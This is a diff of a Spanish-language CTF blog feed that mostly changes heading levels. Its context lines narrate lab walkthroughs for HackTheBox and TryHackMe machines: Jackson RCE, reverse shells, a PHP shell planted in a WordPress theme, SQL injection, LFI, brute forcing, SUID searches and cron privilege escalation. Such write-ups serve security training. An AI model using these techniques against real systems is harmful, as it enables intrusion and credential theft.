@@ -30,7 +30,7 @@
         <atom:modified>Sat, 03 Apr 2021 00:00:00 +0000</atom:modified>
         <guid>https://sckull.github.io/posts/time/</guid>
         <description>Time es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
-        <content:encoded>&lt;p&gt;Time es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+        <content:encoded>&lt;p&gt;&lt;code&gt;Time&lt;/code&gt; es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
 
 
 
@@ -43,7 +43,7 @@
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/time/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -74,7 +74,7 @@
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -138,10 +138,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Mar  5 18:39:27 2021 -- 1 IP address (1 host up) scanned in 11.16 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80 con lo que parece ser un validador para json.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/time/Screenshot_20210305_181340.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;rustbuster-&#34;&gt;RUSTBUSTER&lt;/h3&gt;
+&lt;h2 id=&#34;rustbuster&#34;&gt;RUSTBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos rustbuster para busqueda de directorios y archivos, pero solo encontramos los directorios y archivos que pertenecen a la pagina principal.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -187,7 +187,7 @@ GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                
 GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://10.10.10.214/.php
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;jackson-rce-&#34;&gt;JACKSON RCE&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;jackson-rce&#34;&gt;JACKSON RCE&lt;/h1&gt;
 &lt;p&gt;Ingresamos un valor en el validador (&lt;code&gt;{&amp;quot;a&amp;quot;:&amp;quot;b&amp;quot;}&lt;/code&gt;) para generar un error y nos mostró que utiliza el paquete &lt;a href=&#34;http://fasterxml.com/&#34;&gt;&lt;code&gt;fasterxml&lt;/code&gt;&lt;/a&gt; el cual tiene &lt;a href=&#34;http://fasterxml.com/projects.html&#34;&gt;librerias y extensiones&lt;/a&gt; utiles, en el caso del error mostrado por el validador vemos que la libreria es &lt;strong&gt;Jackson&lt;/strong&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -235,12 +235,12 @@ GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                
 &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;pericles---user-&#34;&gt;PERICLES - USER&lt;/h3&gt;
+&lt;/div&gt;&lt;h1 id=&#34;pericles---user&#34;&gt;PERICLES - USER&lt;/h1&gt;
 &lt;p&gt;Logrando obtener el resultado de la ejecucion del comando.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/time/Screenshot_20210305_184838.png&#34; alt=&#34;&#34; /&gt;&lt;br /&gt;
 Ejecutamos una shell inversa y logramos obtener nuestra shell y flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/time/Screenshot_20210305_185135.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Ejecutamos &lt;code&gt;pspy&lt;/code&gt; y encontramos que hay un servicio que es reiniciado por el usuario root (&lt;code&gt;web_backup.service&lt;/code&gt;) con algun cron, y vemos un script que podria estar relacionado con este, &lt;code&gt;/usr/bin/timer_backup.sh&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -331,7 +331,7 @@ Ejecutamos una shell inversa y logramos obtener nuestra shell y flag &lt;code&gt
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Esperamos a que se vuelva ejecutar el script, y ejecutamos &lt;code&gt;bash -p&lt;/code&gt; lo que nos devuelve una shell como root y logramos obtener la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/time/Screenshot_20210305_192703.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;service-&#34;&gt;SERVICE&lt;/h3&gt;
+&lt;h2 id=&#34;service&#34;&gt;SERVICE&lt;/h2&gt;
 &lt;p&gt;Enumeramos los cron para usuario root pero no aparece ninguno relacionado al servicio &lt;code&gt;web_backup.service&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -482,7 +482,7 @@ root@time:~# cat /etc/systemd/system/timer_backup.timer
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/allinone/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -509,7 +509,7 @@ root@time:~# cat /etc/systemd/system/timer_backup.timer
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap-&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -603,7 +603,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Thu Dec 10 14:03:47 2020 -- 1 IP address (1 host up) scanned in 17.51 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;ftp-&#34;&gt;FTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;ftp-&#34;&gt;FTP&lt;/h1&gt;
 &lt;p&gt;El ingreso por medio de anonymous (anonymous:anonymous) esta permitido, por lo que utilizamos las &amp;ldquo;credenciales&amp;rdquo; en este servicio, pero no encontramos nada.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -649,10 +649,10 @@ ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 &lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http-&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos la pagina web de apache en el puerto 80.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/allinone/Screenshot_20201210_130724.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h3&gt;
+&lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, donde encontramos una direccion hacia una pagina en wordpress.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -671,7 +671,7 @@ ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/allinone/Screenshot_20201210_131446.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;wpscan---wordpress-&#34;&gt;WPSCAN - WORDPRESS&lt;/h3&gt;
+&lt;h2 id=&#34;wpscan---wordpress-&#34;&gt;WPSCAN - WORDPRESS&lt;/h2&gt;
 &lt;p&gt;Utilizamos &lt;code&gt;wpscan&lt;/code&gt; para poder obtener informacion sobre la version, plugins, temas y posibles usuarios en la pagina de wordpress. Vemos que la version de wordpress es 5.5.1 y dos plugins mail-masta 1.0 y reflex-gallery 3.1.7.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -861,7 +861,7 @@ ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/36374&#34;&gt;&lt;strong&gt;WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;sqli---mail-masta-&#34;&gt;SQLI - Mail Masta&lt;/h3&gt;
+&lt;h2 id=&#34;sqli---mail-masta-&#34;&gt;SQLI - Mail Masta&lt;/h2&gt;
 &lt;p&gt;Utilizando SQLMAP logramos obtener las credenciales del usuario &lt;code&gt;elyana&lt;/code&gt; de la base de datos de wordpress.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -953,7 +953,7 @@ Table: wp_users
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;lfi---mail-masta-&#34;&gt;LFI - Mail Masta&lt;/h3&gt;
+&lt;/div&gt;&lt;h2 id=&#34;lfi---mail-masta-&#34;&gt;LFI - Mail Masta&lt;/h2&gt;
 &lt;p&gt;Utilizando el &lt;a href=&#34;https://www.exploit-db.com/exploits/40290&#34;&gt;&lt;strong&gt;&amp;ldquo;proof&amp;rdquo;&lt;/strong&gt;&lt;/a&gt; para Mail Masta logramos leer el archivo &lt;code&gt;wp-config.php&lt;/code&gt; en base64, donde vemos las credenciales de la base de datos y configuraciones de wordpress.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -964,7 +964,7 @@ Table: wp_users
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/allinone/Screenshot_20201210_150510.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;www-data---user-&#34;&gt;WWW-DATA - USER&lt;/h2&gt;
+&lt;h1 id=&#34;www-data---user-&#34;&gt;WWW-DATA - USER&lt;/h1&gt;
 &lt;p&gt;Utilizamos la contraseña y usuario que encontramos en el panel de wordpress donde pudimos obtener acceso y mediante el editor de temas, agregamos una shell inversa al archivo &lt;code&gt;404.php&lt;/code&gt; del tema actual. Con netcat a la escucha logramos obtener una shell con usuario &lt;code&gt;www-data&lt;/code&gt; al provocar un error &lt;code&gt;404.php&lt;/code&gt; agregando una letra en la url del unico post.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/allinone/Screenshot_20201210_154303.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Realizamos una pequeña enumeracion en la carpeta donde se encuentra la pagina de wordpress y encontramos un mensaje en una pagina.&lt;/p&gt;
@@ -1012,7 +1012,7 @@ cat hackathons
 &amp;lt;/html&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion al archivo &lt;code&gt;/etc/crontab&lt;/code&gt; y vemos que existe un cron que ejecuta a cada minuto el archivo &lt;code&gt;/var/backups/script.sh&lt;/code&gt; con usuario root, además este archivo es editable por cualquier usuario.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1165,7 +1165,7 @@ find / -perm -4000 2&amp;gt; /dev/null | xargs ls -lah
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -1192,7 +1192,7 @@ find / -perm -4000 2&amp;gt; /dev/null | xargs ls -lah
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap-&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80), h323q931(?) (1720), cisco-sccp (2000), asterisk (5038) y el puerto ssh (22) abiertos entre otros de los cuales no logramos obtener mucha informacion.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1317,7 +1317,7 @@ Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.40s latency&lt;span cla
 PORT      STATE  SERVICE     VERSION
 22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
-&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd💿14:a2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 80/tcp    open   http        Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
@@ -1354,7 +1354,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Sep 25 15:58:42 2020 -- 1 IP address (1 host up) scanned in 62.78 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http-&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80 en la que nos da un script en python.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/Screenshot_20200925_154029.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1451,7 +1451,7 @@ kali@kali:~/thm/aster$
 /server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;asterisk-&#34;&gt;ASTERISK&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;asterisk-&#34;&gt;ASTERISK&lt;/h1&gt;
 &lt;p&gt;Entre los puertos que encontramos se encuentra &lt;code&gt;Asterisk Call Manager 5.0.2&lt;/code&gt; el cual permite que un usuario se conecte a este puerto y ejecute comandos o lea eventos. Al investigar sobre este &amp;ldquo;servicio/server&amp;rdquo; encontramos un post donde realizan un &lt;a href=&#34;https://www.hackingarticles.in/penetration-testing-on-voip-asterisk-server-part-2/&#34;&gt;&lt;strong&gt;&amp;lsquo;Pentesting&amp;rsquo;&lt;/strong&gt;&lt;/a&gt; a este servicio, primero utilizamos el modulo de metasploit &lt;code&gt;use auxiliary/voip/asterisk_login&lt;/code&gt; el cual realiza un ataque de fuerza bruta, conociendo un nombre de usuario (admin) y utilizando los wordlist que vienen por defecto ejecutamos el modulo. Logrando encontrar la &amp;ldquo;contraseña&amp;rdquo; de este usuario.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1596,7 +1596,7 @@ LastReload: &lt;span class=&#34;m&#34;&gt;5368&lt;/span&gt;
 Status: Fully Booted
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;harry---user-&#34;&gt;HARRY - USER&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;harry---user-&#34;&gt;HARRY - USER&lt;/h1&gt;
 &lt;p&gt;Enumeramos informacion SIP el cual contiene usuarios, &amp;ldquo;contraseñas&amp;rdquo; (secrets) y extensiones. Vemos que tenemos la &amp;ldquo;contraseña&amp;rdquo; del usuario harry, utilizamos esta en el servicio SSH y logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1623,7 +1623,7 @@ Output: harry                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/Screenshot_20200925_180452.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;root-flag-&#34;&gt;ROOT FLAG&lt;/h2&gt;
+&lt;h1 id=&#34;root-flag&#34;&gt;ROOT FLAG&lt;/h1&gt;
 &lt;p&gt;Dentro de la carpeta de &lt;code&gt;harry&lt;/code&gt; encontramos el archivo &lt;strong&gt;Example_Root.jar&lt;/strong&gt; el cual decompilamos utilizando &lt;a href=&#34;http://www.javadecompilers.com/&#34;&gt;&lt;strong&gt;JavaDecompilers&lt;/strong&gt;&lt;/a&gt; y encontramos que el codigo valida que el archivo &lt;code&gt;/tmp/flag.dat&lt;/code&gt; existe, en tal caso escribe dentro de del archivo &lt;code&gt;/home/harry/root.txt&lt;/code&gt; la cadena &lt;code&gt;my secret &amp;lt;3 baby&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1835,7 +1835,7 @@ Output: harry                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -1862,7 +1862,7 @@ Output: harry                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), ssh (22) y el puerto http (80) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1894,7 +1894,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug 12 00:19:54 2020 -- 1 IP address (1 host up) scanned in 32.65 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;ftp-&#34;&gt;FTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
 &lt;p&gt;Ingresamos por el servicio FTP con las credenciales de anonymous (anonymous:anonymous), en donde encontramos dos archivos de texto el primero es posible verlo a simple vista, el segundo tenia un pequeño truco y es que las carpetas estaban con el nombre &lt;code&gt;...&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2022,7 +2022,7 @@ root@upset:~/thm/tartarus# cat yougotgoodeyes.txt
 root@upset:~/thm/tartarus#
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina web de apache en el puerto 80.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_232106.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
@@ -2051,7 +2051,7 @@ root@upset:~/thm/tartarus#
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_232811.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;En el directorio que encontramos en el archivo de texto en FTP logramos ver un panel de logeo.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_232943.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;hydra-&#34;&gt;HYDRA&lt;/h2&gt;
+&lt;h2 id=&#34;hydra&#34;&gt;HYDRA&lt;/h2&gt;
 &lt;p&gt;Utilizamos hydra para hacer un ataque de fuerza bruta al panel de logeo con los wordlists que encontramos. Vemos 16 posibles contraseñas para el usuario &lt;code&gt;enox&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_234029.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Estas 16 posibles se muestran porque logramos encontrar el usuario pero no la contraseña, la sintaxis que utilizamos era para &lt;code&gt;Incorrect username!&lt;/code&gt; y no para &lt;code&gt;Incorrect password!&lt;/code&gt;. Volvemos a utilizar Hydra o probar la ultima contraseña.&lt;/p&gt;
@@ -2077,7 +2077,7 @@ root@upset:~/thm/tartarus#
 /index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;user---www-data-&#34;&gt;USER - WWW-DATA&lt;/h2&gt;
